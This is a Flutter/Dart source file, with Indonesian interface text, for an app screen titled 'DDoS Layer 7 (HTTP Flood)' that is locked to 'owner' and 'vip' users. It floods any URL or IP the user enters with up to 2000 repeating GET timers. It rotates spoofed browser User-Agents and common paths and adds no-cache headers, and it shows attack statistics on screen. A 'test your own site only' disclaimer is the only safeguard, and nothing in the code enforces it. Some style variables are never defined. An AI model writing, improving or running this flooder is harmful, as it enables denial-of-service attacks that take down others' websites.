import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

class DdosLayer7Page extends StatefulWidget {
  final String sessionKey;
  final String userRole;

  const DdosLayer7Page({
    super.key,
    required this.sessionKey,
    required this.userRole,
  });

  @override
  State<DdosLayer7Page> createState() => _DdosLayer7PageState();
}

class _DdosLayer7PageState extends State<DdosLayer7Page> {
  final _targetController = TextEditingController();
  final _portController = TextEditingController(text: "");
  final _threadsController = TextEditingController(text: "");
  final _durationController = TextEditingController(text: "");
  
  bool _isAttacking = false;
  int _totalRequests = 0;
  int _successRequests = 0;
  int _failedRequests = 0;
  Timer? _durationTimer;
  List<Timer> _threadTimers = [];
  
  final Random _random = Random();
  
  final List<String> _userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/119.0 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Edg/119.0.0.0",
  ];
  
  final List<String> _paths = [
    "/", "/index.html", "/api", "/login", "/register", "/home", "/about",
    "/contact", "/product", "/service", "/wp-admin", "/admin", "/api/v1",
    "/api/v2", "/user", "/profile", "/search", "/category", "/blog", "/post",
    "/wp-json", "/graphql", "/api/graphql", "/v1/api", "/rest", "/api/rest",
  ];

  // --- TEMA WARNA HITAM ---
  final Color bgDark = Colors.black;
  final Color bgSecondary = const Color (0xFF1A1A1A);
  final Color accentGrey = const Color (0xFF444444);
  final Color primaryBlack = const Color (0xFF1A1A1A);
  final Color whiteText = Colors.white;
  final Color grayText = Colors.white70;

  @override
  void dispose() {
    _stopAttack();
    super.dispose();
  }

  void _startAttack() {
    String target = _targetController.text.trim();
    String port = _portController.text.trim();
    int threads = int.tryParse(_threadsController.text) ?? 100;
    int duration = int.tryParse(_durationController.text) ?? 60;
    
    if (target.isEmpty) {
      _showAlert("Error", "Masukkan target URL/IP");
      return;
    }
    
    if (!target.startsWith("http")) {
      target = "http://$target";
    }
    
    // Tambahkan port jika bukan port default
    if (port.isNotEmpty && port != "80" && port != "443") {
      target = "$target:$port";
    }
    
    if (threads > 2000) {
      _showAlert("Error", "Maksimal 2000 threads");
      return;
    }
    
    if (duration < 10) {
      _showAlert("Error", "Minimal durasi 10 detik");
      return;
    }
    
    setState(() {
      _isAttacking = true;
      _totalRequests = 0;
      _successRequests = 0;
      _failedRequests = 0;
    });
    
    _showAlert("🔥 ATTACK STARTED 🔥", 
      "Target: $target\nPort: ${port.isEmpty ? "80/443" : port}\nThreads: $threads\nDurasi: ${duration}s\n\nAttack akan berjalan selama $duration detik");
    
    // Timer durasi
    _durationTimer = Timer(Duration(seconds: duration), () {
      _stopAttack();
      _showAlert("✅ ATTACK FINISHED ✅", 
        "Total Request: $_totalRequests\n✅ Success: $_successRequests\n❌ Failed: $_failedRequests");
    });
    
    // Mulai threads
    for (int i = 0; i < threads; i++) {
      final timer = Timer.periodic(Duration(milliseconds: 10), (timer) async {
        if (!_isAttacking) {
          timer.cancel();
          return;
        }
        await _sendRequest(target);
      });
      _threadTimers.add(timer);
    }
  }
  
  void _stopAttack() {
    _durationTimer?.cancel();
    for (var timer in _threadTimers) {
      timer.cancel();
    }
    _threadTimers.clear();
    setState(() {
      _isAttacking = false;
    });
  }
  
  Future<void> _sendRequest(String baseUrl) async {
    if (!_isAttacking) return;
    
    final client = http.Client();
    final randomPath = _paths[_random.nextInt(_paths.length)];
    final url = "$baseUrl$randomPath";
    final userAgent = _userAgents[_random.nextInt(_userAgents.length)];
    
    try {
      final request = http.Request('GET', Uri.parse(url));
      request.headers['User-Agent'] = userAgent;
      request.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
      request.headers['Accept-Language'] = 'en-US,en;q=0.5';
      request.headers['Connection'] = 'keep-alive';
      request.headers['Cache-Control'] = 'no-cache';
      request.headers['Pragma'] = 'no-cache';
      
      final streamedResponse = await request.send();
      final response = await http.Response.fromStream(streamedResponse);
      
      setState(() {
        _totalRequests++;
        if (response.statusCode >= 200 && response.statusCode < 500) {
          _successRequests++;
        } else {
          _failedRequests++;
        }
      });
      
    } catch (e) {
      setState(() {
        _totalRequests++;
        _failedRequests++;
      });
    } finally {
      client.close();
    }
  }
  
  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: Colors.black,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        title: Text(title, style: const TextStyle(color: Colors.yellowAccent, fontFamily: 'Orbitron')),
        content: Text(msg, style: const TextStyle(color: Colors.white70, fontFamily: 'ShareTechMono')),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text("OK", style: TextStyle(color: Colors.yellowAccent)),
          )
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    if (!["owner", "vip"].contains(widget.userRole.toLowerCase())) {
      return Scaffold(
        backgroundColor: bgDark,
        appBar: AppBar(
          title: const Text("DDoS Layer 7", style: TextStyle(fontFamily: 'Orbitron')),
          backgroundColor: Colors.transparent,
        ),
        body: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(Icons.lock, color: Colors.red, size: 80),
              SizedBox(height: 20),
              Text("Akses Ditolak", style: TextStyle(color: Colors.red, fontSize: 24, fontWeight: FontWeight.bold)),
              SizedBox(height: 10),
              Text("Fitur ini hanya untuk Owner dan VIP", style: TextStyle(color: Colors.white54)),
            ],
          ),
        ),
      );
    }
    
    return Scaffold(
      backgroundColor: bgDark,
      appBar: AppBar(
        title: const Text("DDoS Layer 7 (HTTP Flood)", style: TextStyle(fontFamily: 'Orbitron', fontWeight: FontWeight.bold)),
        backgroundColor: Colors.transparent,
        centerTitle: true,
        leading: IconButton(
          icon: Icon(Icons.arrow_back_ios_new, color: accentGrey),
          onPressed: () => Navigator.pop(context),
        ),
      ),
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.all(16),
          child: Column(
            children: [
              // Target URL
              Container(
                padding: EdgeInsets.all(16),
                decoration: BoxDecoration(
                  color: cardBg,
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(color: accentGrey.withOpacity(0.3)),
                ),
                child: Column(
                  children: [
                    Row(
                      children: [
                        Icon(Icons.link, color: accentGrey),
                        SizedBox(width: 10),
                        Text("Target URL / IP", style: TextStyle(color: primaryWhite, fontWeight: FontWeight.bold)),
                      ],
                    ),
                    SizedBox(height: 12),
                    TextField(
                      controller: _targetController,
                      style: TextStyle(color: primaryWhite),
                      decoration: InputDecoration(
                        hintText: "example.com atau 192.168.1.1",
                        hintStyle: TextStyle(color: textGrey),
                        prefixIcon: Icon(Icons.public, color: accentGrey),
                        border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
                      ),
                    ),
                  ],
                ),
              ),
              
              SizedBox(height: 16),
              
              // Port, Threads, Duration
              Row(
                children: [
                  Expanded(
                    child: Container(
                      padding: EdgeInsets.all(16),
                      decoration: BoxDecoration(
                        color: cardBg,
                        borderRadius: BorderRadius.circular(16),
                        border: Border.all(color: accentGrey.withOpacity(0.3)),
                      ),
                      child: Column(
                        children: [
                          Text("Port", style: TextStyle(color: accentGrey, fontSize: 12)),
                          TextField(
                            controller: _portController,
                            keyboardType: TextInputType.number,
                            style: TextStyle(color: primaryWhite, fontSize: 20, fontWeight: FontWeight.bold),
                            textAlign: TextAlign.center,
                            decoration: InputDecoration(
                              hintText: "80",
                              border: InputBorder.none,
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                  SizedBox(width: 12),
                  Expanded(
                    child: Container(
                      padding: EdgeInsets.all(16),
                      decoration: BoxDecoration(
                        color: cardBg,
                        borderRadius: BorderRadius.circular(16),
                        border: Border.all(color: accentGrey.withOpacity(0.3)),
                      ),
                      child: Column(
                        children: [
                          Text("Threads", style: TextStyle(color: accentGrey, fontSize: 12)),
                          TextField(
                            controller: _threadsController,
                            keyboardType: TextInputType.number,
                            style: TextStyle(color: primaryWhite, fontSize: 20, fontWeight: FontWeight.bold),
                            textAlign: TextAlign.center,
                            decoration: InputDecoration(
                              hintText: "100",
                              border: InputBorder.none,
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                  SizedBox(width: 12),
                  Expanded(
                    child: Container(
                      padding: EdgeInsets.all(16),
                      decoration: BoxDecoration(
                        color: cardBg,
                        borderRadius: BorderRadius.circular(16),
                        border: Border.all(color: accentGrey.withOpacity(0.3)),
                      ),
                      child: Column(
                        children: [
                          Text("Durasi (detik)", style: TextStyle(color: accentGrey, fontSize: 12)),
                          TextField(
                            controller: _durationController,
                            keyboardType: TextInputType.number,
                            style: TextStyle(color: primaryWhite, fontSize: 20, fontWeight: FontWeight.bold),
                            textAlign: TextAlign.center,
                            decoration: InputDecoration(
                              hintText: "60",
                              border: InputBorder.none,
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
              
              SizedBox(height: 16),
              
              // Stats
              Container(
                padding: EdgeInsets.all(16),
                decoration: BoxDecoration(
                  color: cardBg,
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(color: accentGrey.withOpacity(0.3)),
                ),
                child: Column(
                  children: [
                    Text("STATISTIK", style: TextStyle(color: Colors.yellowAccent, fontWeight: FontWeight.bold, fontSize: 16)),
                    SizedBox(height: 12),
                    Row(
                      mainAxisAlignment: MainAxisAlignment.spaceAround,
                      children: [
                        _statCard("TOTAL", "$_totalRequests", Colors.blue),
                        _statCard("SUCCESS", "$_successRequests", Colors.green),
                        _statCard("FAILED", "$_failedRequests", Colors.red),
                      ],
                    ),
                    if (_totalRequests > 0)
                      Padding(
                        padding: EdgeInsets.only(top: 12),
                        child: LinearProgressIndicator(
                          value: _successRequests / _totalRequests,
                          backgroundColor: Colors.red,
                          color: Colors.green,
                        ),
                      ),
                    if (_isAttacking)
                      Padding(
                        padding: EdgeInsets.only(top: 12),
                        child: Row(
                          children: [
                            SizedBox(
                              width: 20,
                              height: 20,
                              child: CircularProgressIndicator(strokeWidth: 2, color: Colors.yellow),
                            ),
                            SizedBox(width: 10),
                            Text("ATTACKING...", style: TextStyle(color: Colors.yellow, fontWeight: FontWeight.bold)),
                          ],
                        ),
                      ),
                  ],
                ),
              ),
              
              SizedBox(height: 24),
              
              // Attack Button
              SizedBox(
                width: double.infinity,
                child: ElevatedButton.icon(
                  onPressed: _isAttacking ? null : _startAttack,
                  icon: Icon(Icons.flash_on),
                  label: Text(
                    _isAttacking ? "ATTACKING..." : "START ATTACK",
                    style: TextStyle(fontWeight: FontWeight.bold, fontSize: 18),
                  ),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: _isAttacking ? Colors.grey : Colors.red,
                    padding: EdgeInsets.symmetric(vertical: 16),
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                  ),
                ),
              ),
              
              SizedBox(height: 16),
              
              // Info
              Container(
                padding: EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: cardBg,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: accentGrey.withOpacity(0.3)),
                ),
                child: Row(
                  children: [
                    Icon(Icons.info_outline, color: accentGrey, size: 16),
                    SizedBox(width: 8),
                    Expanded(
                      child: Text(
                        "⚠️ Cara Penggunaan:\n"
                        "1. Masukkan target (contoh: example.com)\n"
                        "2. Masukkan port (default: 80 untuk HTTP)\n"
                        "3. Atur threads (100-2000)\n"
                        "4. Atur durasi attack (detik)\n"
                        "5. Klik START ATTACK\n\n"
                        "⚠️ Hanya untuk testing website sendiri!\n"
                        "⚠️ Risiko ditanggung sendiri!",
                        style: TextStyle(color: textGrey, fontSize: 11),
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
  
  Widget _statCard(String label, String value, Color color) {
    return Container(
      padding: EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      decoration: BoxDecoration(
        color: color.withOpacity(0.15),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: color.withOpacity(0.5)),
      ),
      child: Column(
        children: [
          Text(label, style: TextStyle(color: color, fontSize: 12, fontWeight: FontWeight.bold)),
          Text(value, style: TextStyle(color: primaryWhite, fontSize: 24, fontWeight: FontWeight.bold)),
        ],
      ),
    );
  }
}